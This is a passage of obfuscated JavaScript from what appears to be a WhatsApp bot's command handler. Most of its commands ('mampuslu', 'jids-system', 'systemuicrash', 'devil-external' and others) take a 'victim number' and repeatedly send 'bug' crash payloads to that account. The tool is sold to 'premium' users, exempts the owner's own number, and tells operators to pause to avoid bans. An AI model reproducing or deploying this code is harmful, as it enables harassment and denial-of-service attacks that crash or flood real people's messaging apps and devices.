            await _0x29f40b(_0x552cc0, _0x1c96d1);
            await _0x29f40b(_0x552cc0, _0x1c96d1);
            await _0xac0c3(_0x552cc0, _0x1c96d1);
            await _0x29f40b(_0x552cc0, _0x1c96d1);
            await _0xac0c3(_0x552cc0, _0x1c96d1);
          }
          await _0x5c4040("<✓> Successfully Send Bug to " + _0x20a55b + " Using " + _0x256829 + ". ✅\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case 'mampuslu':
        {
          if (!_0x5e0f00) {
            return _0x5c4040(mess.only.premium);
          }
          if (!q) {
            return _0x5c4040("Usage ." + _0x256829 + " 94742274855");
          }
          let _0x3d9eab = q.replace(/[^0-9]/g, '');
          if (_0x3d9eab.startsWith('0')) {
            return _0x5c4040("<!> The number starts with the number 0. Replace it with the number starting with the country code\n\n<✓> Example : ." + _0x256829 + " 94742274855");
          }
          let _0x5efb07 = _0x3d9eab + '@s.whatsapp.net';
          await _0x5c4040("In proses....");
          for (let _0xd3e153 = 0x0; _0xd3e153 < 0x1e; _0xd3e153++) {
            await _0xac0c3(_0x5efb07, _0x1c96d1);
            await _0x29f40b(_0x5efb07, _0x1c96d1);
            await _0x29f40b(_0x5efb07, _0x1c96d1);
            await _0xac0c3(_0x5efb07, _0x1c96d1);
            await _0x29f40b(_0x5efb07, _0x1c96d1);
            await _0xac0c3(_0x5efb07, _0x1c96d1);
            await _0xac0c3(_0x5efb07, _0x1c96d1);
            await _0x29f40b(_0x5efb07, _0x1c96d1);
            await _0x29f40b(_0x5efb07, _0x1c96d1);
            await _0xac0c3(_0x5efb07, _0x1c96d1);
            await _0x29f40b(_0x5efb07, _0x1c96d1);
            await _0xac0c3(_0x5efb07, _0x1c96d1);
            await _0xac0c3(_0x5efb07, _0x1c96d1);
            await _0x29f40b(_0x5efb07, _0x1c96d1);
            await _0x29f40b(_0x5efb07, _0x1c96d1);
            await _0xac0c3(_0x5efb07, _0x1c96d1);
            await _0x29f40b(_0x5efb07, _0x1c96d1);
            await _0xac0c3(_0x5efb07, _0x1c96d1);
            await _0xac0c3(_0x5efb07, _0x1c96d1);
            await _0x29f40b(_0x5efb07, _0x1c96d1);
            await _0x29f40b(_0x5efb07, _0x1c96d1);
            await _0xac0c3(_0x5efb07, _0x1c96d1);
            await _0x29f40b(_0x5efb07, _0x1c96d1);
            await _0xac0c3(_0x5efb07, _0x1c96d1);
          }
          await _0x5c4040("<✓> Successfully Send Bug to " + _0x3d9eab + " Using " + _0x256829 + ". ✅\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "boton":
        {
          if (!_0x5e0f00) {
            return _0x5c4040(mess.only.premium);
          }
          if (!_0x46a982) {
            return _0x5c4040(mess.only.owner);
          }
          let _0x489623 = await _0x29487e.groupFetchAllParticipating();
          let _0x616e1a = Object.entries(_0x489623).slice(0x0).map(_0x315d0a => _0x315d0a[0x1]);
          let _0x327a15 = _0x616e1a.map(_0x1fcce0 => _0x1fcce0.id);
          const _0x54f05c = await getBuffer('https://img.moehu.org/pic.php?id=mrfz');
          for (let _0x259cd9 of _0x327a15) {
            await _0x29487e.sendMessage(_0x259cd9, {
              'audio': fs.readFileSync("./lib/IMLEK.mp3"),
              'mimetype': "audio/mpeg",
              'ptt': true
            }, _0x26c51b);
            await _0x29487e.sendMessage(_0x259cd9, {
              'contextInfo': {
                'forwardingScore': 0xa,
                'isForwarded': false
              },
              'image': _0x54f05c,
              'caption': "*[!] ANNOUNCEMENT*📢\n\n_BOT telah online, sekarang anda bisa menjadi bot clone dengan cara, *ketik .jadibot* dan *ketik .menu* untuk melihat daftar list yang disediakan oleh BOT_"
            });
            await sleep(0x64);
          }
          _0x5c4040("Success send broadcast message to " + _0x327a15.length + " groups chats");
        }
        break;
      case "hdvid":
      case "hdvideo":
      case "vidiohd":
      case "tohd":
      case "vidhd":
        {
          const {
            exec: _0x5adc9a
          } = require("child_process");
          const _0x4e81dd = _0x26c51b.quoted ? _0x26c51b.quoted : _0x26c51b;
          const _0x157acc = (_0x4e81dd.msg || _0x4e81dd).mimetype || '';
          if (!_0x157acc) {
            return _0x26c51b.reply("Mana vidio nya bang?");
          }
          _0x5c4040(mess.wait);
          const _0x5e0b25 = await _0x29487e.downloadAndSaveMediaMessage(_0x4e81dd);
          _0x5adc9a("ffmpeg -i " + _0x5e0b25 + " -s 1280x720 -c:v libx264 -c:a copy " + 'output.mp4', (_0x21aa51, _0x3bc5a6, _0x4b7faf) => {
            if (_0x21aa51) {
              console.error("Error: " + _0x21aa51.message);
              return;
            }
            console.log("stdout: " + _0x3bc5a6);
            console.error("stderr: " + _0x4b7faf);
            _0x29487e.sendMessage(_0x26c51b.chat, {
              'caption': "_Success To HD Video_",
              'video': {
                'url': 'output.mp4'
              }
            }, {
              'quoted': _0x26c51b
            });
          });
          await sleep(0xea60);
          fs.unlinkSync('output.mp4');
          fs.unlinkSync(_0x5e0b25);
        }
        break;
      case "enc":
      case "encrypt":
      case 'obfuscate':
        {
          if (!q) {
            return _0x5c4040("Contact " + (_0x460782 + _0x256829) + " const time = require('money')");
          }
          let _0x376ae7 = await _0x59bb05(q);
          _0x5c4040('' + _0x376ae7.result);
        }
        break;
      case "goyang":
        {
          if (!_0x5e0f00) {
            return _0x5c4040(mess.only.premium);
          }
          if (!q) {
            return _0x5c4040("Usage ." + _0x256829 + " 94742274855");
          }
          let _0x399139 = q.replace(/[^0-9]/g, '');
          if (_0x399139.startsWith('0')) {
            return _0x5c4040("<!> The number starts with the number 0. Replace it with the number starting with the country code\n\n<✓> Example : ." + _0x256829 + " 94742274855");
          }
          let _0x88f63e = _0x399139 + "@s.whatsapp.net";
          await _0x5c4040("In proses....");
          for (let _0x1f3e21 = 0x0; _0x1f3e21 < 0x1e; _0x1f3e21++) {
            await _0xac0c3(_0x88f63e, _0x1c96d1);
            await _0x29f40b(_0x88f63e, _0x1c96d1);
            await _0x29f40b(_0x88f63e, _0x1c96d1);
            await _0xac0c3(_0x88f63e, _0x1c96d1);
            await _0x29f40b(_0x88f63e, _0x1c96d1);
            await _0xac0c3(_0x88f63e, _0x1c96d1);
            await _0xac0c3(_0x88f63e, _0x1c96d1);
            await _0x29f40b(_0x88f63e, _0x1c96d1);
            await _0x29f40b(_0x88f63e, _0x1c96d1);
            await _0xac0c3(_0x88f63e, _0x1c96d1);
            await _0x29f40b(_0x88f63e, _0x1c96d1);
            await _0xac0c3(_0x88f63e, _0x1c96d1);
            await _0xac0c3(_0x88f63e, _0x1c96d1);
            await _0x29f40b(_0x88f63e, _0x1c96d1);
            await _0x29f40b(_0x88f63e, _0x1c96d1);
            await _0xac0c3(_0x88f63e, _0x1c96d1);
            await _0x29f40b(_0x88f63e, _0x1c96d1);
            await _0xac0c3(_0x88f63e, _0x1c96d1);
            await _0xac0c3(_0x88f63e, _0x1c96d1);
            await _0x29f40b(_0x88f63e, _0x1c96d1);
            await _0x29f40b(_0x88f63e, _0x1c96d1);
            await _0xac0c3(_0x88f63e, _0x1c96d1);
            await _0x29f40b(_0x88f63e, _0x1c96d1);
            await _0xac0c3(_0x88f63e, _0x1c96d1);
          }
          await _0x5c4040("<✓> Successfully Send Bug to " + _0x399139 + " Using " + _0x256829 + ". ✅\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "jomok":
        {
          if (!_0x5e0f00) {
            return _0x5c4040(mess.only.premium);
          }
          if (!q) {
            return _0x5c4040("Usage ." + _0x256829 + " 94742274855");
          }
          let _0x4b550d = q.replace(/[^0-9]/g, '');
          if (_0x4b550d.startsWith('0')) {
            return _0x5c4040("<!> The number starts with the number 0. Replace it with the number starting with the country code\n\n<✓> Example : ." + _0x256829 + " 94742274855");
          }
          let _0x5812ec = _0x4b550d + "@s.whatsapp.net";
          await _0x5c4040("In proses....");
          for (let _0x394421 = 0x0; _0x394421 < 0x1e; _0x394421++) {
            await _0xac0c3(_0x5812ec, _0x1c96d1);
            await _0x29f40b(_0x5812ec, _0x1c96d1);
            await _0x29f40b(_0x5812ec, _0x1c96d1);
            await _0xac0c3(_0x5812ec, _0x1c96d1);
            await _0x29f40b(_0x5812ec, _0x1c96d1);
            await _0xac0c3(_0x5812ec, _0x1c96d1);
            await _0xac0c3(_0x5812ec, _0x1c96d1);
            await _0x29f40b(_0x5812ec, _0x1c96d1);
            await _0x29f40b(_0x5812ec, _0x1c96d1);
            await _0xac0c3(_0x5812ec, _0x1c96d1);
            await _0x29f40b(_0x5812ec, _0x1c96d1);
            await _0xac0c3(_0x5812ec, _0x1c96d1);
            await _0xac0c3(_0x5812ec, _0x1c96d1);
            await _0x29f40b(_0x5812ec, _0x1c96d1);
            await _0x29f40b(_0x5812ec, _0x1c96d1);
            await _0xac0c3(_0x5812ec, _0x1c96d1);
            await _0x29f40b(_0x5812ec, _0x1c96d1);
            await _0xac0c3(_0x5812ec, _0x1c96d1);
            await _0xac0c3(_0x5812ec, _0x1c96d1);
            await _0x29f40b(_0x5812ec, _0x1c96d1);
            await _0x29f40b(_0x5812ec, _0x1c96d1);
            await _0xac0c3(_0x5812ec, _0x1c96d1);
            await _0x29f40b(_0x5812ec, _0x1c96d1);
            await _0xac0c3(_0x5812ec, _0x1c96d1);
          }
          await _0x5c4040("<✓> Successfully Send Bug to " + _0x4b550d + " Using " + _0x256829 + ". ✅\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "kekuatanhitam":
        {
          if (!_0x5e0f00) {
            return _0x5c4040(mess.only.premium);
          }
          if (!q) {
            return _0x5c4040("Usage ." + _0x256829 + " 94742274855");
          }
          let _0x4e1902 = q.replace(/[^0-9]/g, '');
          if (_0x4e1902.startsWith('0')) {
            return _0x5c4040("<!> The number starts with the number 0. Replace it with the number starting with the country code\n\n<✓> Example : ." + _0x256829 + " 94742274855");
          }
          let _0x4c0002 = _0x4e1902 + "@s.whatsapp.net";
          await _0x5c4040("In proses....");
          for (let _0x1f8ae2 = 0x0; _0x1f8ae2 < 0x1e; _0x1f8ae2++) {
            await _0xac0c3(_0x4c0002, _0x1c96d1);
            await _0x29f40b(_0x4c0002, _0x1c96d1);
            await _0x29f40b(_0x4c0002, _0x1c96d1);
            await _0xac0c3(_0x4c0002, _0x1c96d1);
            await _0x29f40b(_0x4c0002, _0x1c96d1);
            await _0xac0c3(_0x4c0002, _0x1c96d1);
            await _0xac0c3(_0x4c0002, _0x1c96d1);
            await _0x29f40b(_0x4c0002, _0x1c96d1);
            await _0x29f40b(_0x4c0002, _0x1c96d1);
            await _0xac0c3(_0x4c0002, _0x1c96d1);
            await _0x29f40b(_0x4c0002, _0x1c96d1);
            await _0xac0c3(_0x4c0002, _0x1c96d1);
            await _0xac0c3(_0x4c0002, _0x1c96d1);
            await _0x29f40b(_0x4c0002, _0x1c96d1);
            await _0x29f40b(_0x4c0002, _0x1c96d1);
            await _0xac0c3(_0x4c0002, _0x1c96d1);
            await _0x29f40b(_0x4c0002, _0x1c96d1);
            await _0xac0c3(_0x4c0002, _0x1c96d1);
            await _0xac0c3(_0x4c0002, _0x1c96d1);
            await _0x29f40b(_0x4c0002, _0x1c96d1);
            await _0x29f40b(_0x4c0002, _0x1c96d1);
            await _0xac0c3(_0x4c0002, _0x1c96d1);
            await _0x29f40b(_0x4c0002, _0x1c96d1);
            await _0xac0c3(_0x4c0002, _0x1c96d1);
          }
          await _0x5c4040("<✓> Successfully Send Bug to " + _0x4e1902 + " Using " + _0x256829 + ". ✅\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "cringe":
        {
          if (!_0x5e0f00) {
            return _0x5c4040(mess.only.premium);
          }
          if (!q) {
            return _0x5c4040("Usage ." + _0x256829 + " 94742274855");
          }
          let _0x39a036 = q.replace(/[^0-9]/g, '');
          if (_0x39a036.startsWith('0')) {
            return _0x5c4040("<!> The number starts with the number 0. Replace it with the number starting with the country code\n\n<✓> Example : ." + _0x256829 + " 94742274855");
          }
          let _0x18b2a0 = _0x39a036 + "@s.whatsapp.net";
          await _0x5c4040("In proses....");
          for (let _0x156c43 = 0x0; _0x156c43 < 0x1e; _0x156c43++) {
            await _0xac0c3(_0x18b2a0, _0x1c96d1);
            await _0x29f40b(_0x18b2a0, _0x1c96d1);
            await _0x29f40b(_0x18b2a0, _0x1c96d1);
            await _0xac0c3(_0x18b2a0, _0x1c96d1);
            await _0x29f40b(_0x18b2a0, _0x1c96d1);
            await _0xac0c3(_0x18b2a0, _0x1c96d1);
            await _0xac0c3(_0x18b2a0, _0x1c96d1);
            await _0x29f40b(_0x18b2a0, _0x1c96d1);
            await _0x29f40b(_0x18b2a0, _0x1c96d1);
            await _0xac0c3(_0x18b2a0, _0x1c96d1);
            await _0x29f40b(_0x18b2a0, _0x1c96d1);
            await _0xac0c3(_0x18b2a0, _0x1c96d1);
            await _0xac0c3(_0x18b2a0, _0x1c96d1);
            await _0x29f40b(_0x18b2a0, _0x1c96d1);
            await _0x29f40b(_0x18b2a0, _0x1c96d1);
            await _0xac0c3(_0x18b2a0, _0x1c96d1);
            await _0x29f40b(_0x18b2a0, _0x1c96d1);
            await _0xac0c3(_0x18b2a0, _0x1c96d1);
            await _0xac0c3(_0x18b2a0, _0x1c96d1);
            await _0x29f40b(_0x18b2a0, _0x1c96d1);
            await _0x29f40b(_0x18b2a0, _0x1c96d1);
            await _0xac0c3(_0x18b2a0, _0x1c96d1);
            await _0x29f40b(_0x18b2a0, _0x1c96d1);
            await _0xac0c3(_0x18b2a0, _0x1c96d1);
          }
          await _0x5c4040("<✓> Successfully Send Bug to " + _0x39a036 + " Using " + _0x256829 + ". ✅\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "addowner":
        if (!_0x46a982) {
          return _0x5c4040(mess.only.owner);
        }
        if (!_0x135d23[0x0]) {
          return _0x5c4040("Usage " + (_0x460782 + _0x256829) + " number\nContact " + (_0x460782 + _0x256829) + " 94742274855");
        }
        bnnd = q.split('|')[0x0].replace(/[^0-9]/g, '');
        let _0x58bed1 = await _0x29487e.onWhatsApp(bnnd + "@s.whatsapp.net");
        if (_0x58bed1.length == 0x0) {
          return _0x5c4040("Enter a valid and registered number on WhatsApp!!!");
        }
        _0x3b8ab9.push(bnnd);
        fs.writeFileSync("./all/database/owner.json", JSON.stringify(_0x3b8ab9));
        _0x5c4040("number " + bnnd + " Telah Menjadi Owner!!!");
        break;
      case "delowner":
        if (!_0x46a982) {
          return _0x5c4040(mess.only.owner);
        }
        if (!_0x135d23[0x0]) {
          return _0x5c4040("Usage " + (_0x460782 + _0x256829) + " number\nContact " + (_0x460782 + _0x256829) + " 94742274855");
        }
        ya = q.split('|')[0x0].replace(/[^0-9]/g, '');
        unp = _0x3b8ab9.indexOf(ya);
        _0x3b8ab9.splice(unp, 0x1);
        fs.writeFileSync('./all/database/owner.json', JSON.stringify(_0x3b8ab9));
        _0x5c4040("number " + ya + " Telah Di Hapus Owner!!!");
        break;
      case 'jids-unexpected':
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x1b77d5) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          let _0x2a9e64 = _0x1b77d5.split(',')[0x0];
          let _0x396372 = _0x1b77d5.split(',')[0x1] * 0x5;
          if (!_0x2a9e64 || !_0x396372) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x396372))) {
            return _0x5c4040("Amount must be a number");
          }
          let _0x274a13 = _0x2a9e64.replace(/[^0-9]/g, '');
          let _0x25a4b1 = '' + encodeURI(_0x396372);
          var _0x42504b = await _0x29487e.onWhatsApp(_0x274a13 + '@s.whatsapp.net');
          let _0x50afb7 = _0x274a13 + "@s.whatsapp.net";
          if (_0x274a13 == "94742274855") {
            return;
          }
          if (_0x42504b.length == 0x0) {
            return _0x5c4040("The number is not registered on WhatsApp");
          }
          _0x5c4040("please wait, " + _0x256829 + " bug is in process..");
          await sleep(0x7d0);
          _0x559b2f(_0x50afb7, _0x25a4b1);
          await sleep(0x9c4);
          _0x324cd4("Successfully Sent Bug To @" + _0x50afb7.split('@')[0x0] + " Using *" + _0x256829 + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", [_0x50afb7]);
        }
        break;
      case "jids-lol":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x1b77d5) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          let _0x5c70a7 = _0x1b77d5.split(',')[0x0];
          let _0x375ffe = _0x1b77d5.split(',')[0x1] * 0x5;
          if (!_0x5c70a7 || !_0x375ffe) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x375ffe))) {
            return _0x5c4040("Amount must be a number");
          }
          let _0x278791 = _0x5c70a7.replace(/[^0-9]/g, '');
          let _0x384aa6 = '' + encodeURI(_0x375ffe);
          var _0x42504b = await _0x29487e.onWhatsApp(_0x278791 + "@s.whatsapp.net");
          let _0xba3a57 = _0x278791 + "@s.whatsapp.net";
          if (_0x278791 == "94742274855") {
            return;
          }
          if (_0x42504b.length == 0x0) {
            return _0x5c4040("The number is not registered on WhatsApp");
          }
          _0x5c4040("please wait, " + _0x256829 + " bug is in process..");
          await sleep(0x7d0);
          _0x559b2f(_0xba3a57, _0x384aa6);
          await sleep(0x9c4);
          _0x324cd4("Successfully Sent Bug To @" + _0xba3a57.split('@')[0x0] + " Using *" + _0x256829 + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", [_0xba3a57]);
        }
        break;
      case 'jids-system':
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x1b77d5) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          let _0x58b7d6 = _0x1b77d5.split(',')[0x0];
          let _0x24429b = _0x1b77d5.split(',')[0x1] * 0x5;
          if (!_0x58b7d6 || !_0x24429b) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x24429b))) {
            return _0x5c4040("Amount must be a number");
          }
          let _0x468562 = _0x58b7d6.replace(/[^0-9]/g, '');
          let _0x58391a = '' + encodeURI(_0x24429b);
          var _0x42504b = await _0x29487e.onWhatsApp(_0x468562 + '@s.whatsapp.net');
          let _0x1dc5a2 = _0x468562 + "@s.whatsapp.net";
          if (_0x468562 == "94742274855") {
            return;
          }
          if (_0x42504b.length == 0x0) {
            return _0x5c4040("The number is not registered on WhatsApp");
          }
          _0x5c4040("please wait, " + _0x256829 + " bug is in process..");
          await sleep(0x7d0);
          _0x559b2f(_0x1dc5a2, _0x58391a);
          await sleep(0x9c4);
          _0x324cd4("Successfully Sent Bug To @" + _0x1dc5a2.split('@')[0x0] + " Using *" + _0x256829 + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", [_0x1dc5a2]);
        }
        break;
      case "jids-toui":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x1b77d5) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          let _0x373c28 = _0x1b77d5.split(',')[0x0];
          let _0x1b412d = _0x1b77d5.split(',')[0x1] * 0x5;
          if (!_0x373c28 || !_0x1b412d) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x1b412d))) {
            return _0x5c4040("Amount must be a number");
          }
          let _0x402957 = _0x373c28.replace(/[^0-9]/g, '');
          let _0x50f2ca = '' + encodeURI(_0x1b412d);
          var _0x42504b = await _0x29487e.onWhatsApp(_0x402957 + '@s.whatsapp.net');
          let _0x15ea2f = _0x402957 + '@s.whatsapp.net';
          if (_0x402957 == "94742274855") {
            return;
          }
          if (_0x42504b.length == 0x0) {
            return _0x5c4040("The number is not registered on WhatsApp");
          }
          _0x5c4040("please wait, " + _0x256829 + " bug is in process..");
          await sleep(0x7d0);
          _0x559b2f(_0x15ea2f, _0x50f2ca);
          await sleep(0x9c4);
          _0x324cd4("Successfully Sent Bug To @" + _0x15ea2f.split('@')[0x0] + " Using *" + _0x256829 + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", [_0x15ea2f]);
        }
        break;
      case "jids-external":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x1b77d5) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          let _0x2f881a = _0x1b77d5.split(',')[0x0];
          let _0x5486a3 = _0x1b77d5.split(',')[0x1] * 0x5;
          if (!_0x2f881a || !_0x5486a3) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x5486a3))) {
            return _0x5c4040("Amount must be a number");
          }
          let _0x3f5535 = _0x2f881a.replace(/[^0-9]/g, '');
          let _0x165190 = '' + encodeURI(_0x5486a3);
          var _0x42504b = await _0x29487e.onWhatsApp(_0x3f5535 + "@s.whatsapp.net");
          let _0x1c0817 = _0x3f5535 + "@s.whatsapp.net";
          if (_0x3f5535 == "94742274855") {
            return;
          }
          if (_0x42504b.length == 0x0) {
            return _0x5c4040("The number is not registered on WhatsApp");
          }
          _0x5c4040("please wait, " + _0x256829 + " bug is in process..");
          await sleep(0x7d0);
          _0x559b2f(_0x1c0817, _0x165190);
          await sleep(0x9c4);
          _0x324cd4("Successfully Sent Bug To @" + _0x1c0817.split('@')[0x0] + " Using *" + _0x256829 + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", [_0x1c0817]);
        }
        break;
      case "jids-internal":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x1b77d5) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          let _0x441020 = _0x1b77d5.split(',')[0x0];
          let _0x352d2a = _0x1b77d5.split(',')[0x1] * 0x5;
          if (!_0x441020 || !_0x352d2a) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x352d2a))) {
            return _0x5c4040("Amount must be a number");
          }
          let _0x588561 = _0x441020.replace(/[^0-9]/g, '');
          let _0xa387c6 = '' + encodeURI(_0x352d2a);
          var _0x42504b = await _0x29487e.onWhatsApp(_0x588561 + "@s.whatsapp.net");
          let _0x6dd107 = _0x588561 + "@s.whatsapp.net";
          if (_0x588561 == "94742274855") {
            return;
          }
          if (_0x42504b.length == 0x0) {
            return _0x5c4040("The number is not registered on WhatsApp");
          }
          _0x5c4040("please wait, " + _0x256829 + " bug is in process..");
          await sleep(0x7d0);
          _0x559b2f(_0x6dd107, _0xa387c6);
          await sleep(0x9c4);
          _0x324cd4("Successfully Sent Bug To @" + _0x6dd107.split('@')[0x0] + " Using *" + _0x256829 + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", [_0x6dd107]);
        }
        break;
      case "jids-engine":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x1b77d5) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          let _0x38ac28 = _0x1b77d5.split(',')[0x0];
          let _0x37a071 = _0x1b77d5.split(',')[0x1] * 0x5;
          if (!_0x38ac28 || !_0x37a071) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x37a071))) {
            return _0x5c4040("Amount must be a number");
          }
          let _0x41d130 = _0x38ac28.replace(/[^0-9]/g, '');
          let _0xd959b7 = '' + encodeURI(_0x37a071);
          var _0x42504b = await _0x29487e.onWhatsApp(_0x41d130 + "@s.whatsapp.net");
          let _0x105ad1 = _0x41d130 + '@s.whatsapp.net';
          if (_0x41d130 == "94742274855") {
            return;
          }
          if (_0x42504b.length == 0x0) {
            return _0x5c4040("The number is not registered on WhatsApp");
          }
          _0x5c4040("please wait, " + _0x256829 + " bug is in process..");
          await sleep(0x7d0);
          _0x559b2f(_0x105ad1, _0xd959b7);
          await sleep(0x9c4);
          _0x324cd4("Successfully Sent Bug To @" + _0x105ad1.split('@')[0x0] + " Using *" + _0x256829 + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", [_0x105ad1]);
        }
        break;
      case 'z':
      case "hidetag":
        if (!_0x46a982) {
          return _0x5c4040(mess.only.owner);
        }
        if (!_0x1b77d5) {
          return _0x5c4040("Teks?");
        }
        _0x29487e.sendMessage(_0x26c51b.chat, {
          'text': _0x1b77d5 ? _0x1b77d5 : '',
          'mentions': _0x38988b.map(_0x1ee362 => _0x1ee362.id)
        }, {
          'quoted': _0x26c51b
        });
        break;
      case "systemuicrash":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x1b77d5) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          let _0x2f3d5a = _0x1b77d5.split(',')[0x0];
          let _0x465bf9 = _0x1b77d5.split(',')[0x1] * 0x5;
          if (!_0x2f3d5a || !_0x465bf9) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x465bf9))) {
            return _0x5c4040("Amount must be a number");
          }
          let _0xdba647 = _0x2f3d5a.replace(/[^0-9]/g, '');
          let _0xc0b20d = '' + encodeURI(_0x465bf9);
          var _0x42504b = await _0x29487e.onWhatsApp(_0xdba647 + "@s.whatsapp.net");
          let _0x5a7531 = _0xdba647 + "@s.whatsapp.net";
          if (_0xdba647 == "94742274855") {
            return;
          }
          if (_0x42504b.length == 0x0) {
            return _0x5c4040("The number is not registered on WhatsApp");
          }
          _0x5c4040("please wait, " + _0x256829 + " bug is in process..");
          await sleep(0x7d0);
          _0x559b2f(_0x5a7531, _0xc0b20d);
          await sleep(0x9c4);
          _0x324cd4("Successfully Sent Bug To @" + _0x5a7531.split('@')[0x0] + " Using *" + _0x256829 + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", [_0x5a7531]);
        }
        break;
      case "devil-external":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x1b77d5) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          let _0x251d6d = _0x1b77d5.split(',')[0x0];
          let _0x484651 = _0x1b77d5.split(',')[0x1] * 0x5;
          if (!_0x251d6d || !_0x484651) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x484651))) {
            return _0x5c4040("Amount must be a number");
          }
          let _0x47dd0d = _0x251d6d.replace(/[^0-9]/g, '');
          let _0x191d72 = '' + encodeURI(_0x484651);
          var _0x42504b = await _0x29487e.onWhatsApp(_0x47dd0d + "@s.whatsapp.net");
          let _0x48e4e5 = _0x47dd0d + "@s.whatsapp.net";
          if (_0x47dd0d == "94742274855") {
            return;
          }
          if (_0x42504b.length == 0x0) {
            return _0x5c4040("The number is not registered on WhatsApp");
          }
          _0x5c4040("please wait, " + _0x256829 + " bug is in process..");
          await sleep(0x7d0);
          _0x559b2f(_0x48e4e5, _0x191d72);
          await sleep(0x9c4);
          _0x324cd4("Successfully Sent Bug To @" + _0x48e4e5.split('@')[0x0] + " Using *" + _0x256829 + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", [_0x48e4e5]);
        }
        break;
      case "devil-internal":
        {
          if (!_0x5e0f00) {
            return _0x5c4040("specifically for premium users, if you want premium, buy it from the owner using the .owner method");
          }
          if (!_0x1b77d5) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          let _0x4aa54e = _0x1b77d5.split(',')[0x0];
          let _0x47bfad = _0x1b77d5.split(',')[0x1] * 0x5;
          if (!_0x4aa54e || !_0x47bfad) {
            return _0x5c4040("Use " + (_0x460782 + _0x256829) + " victim number|amount\nExample " + (_0x460782 + _0x256829) + " 94xxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x47bfad))) {
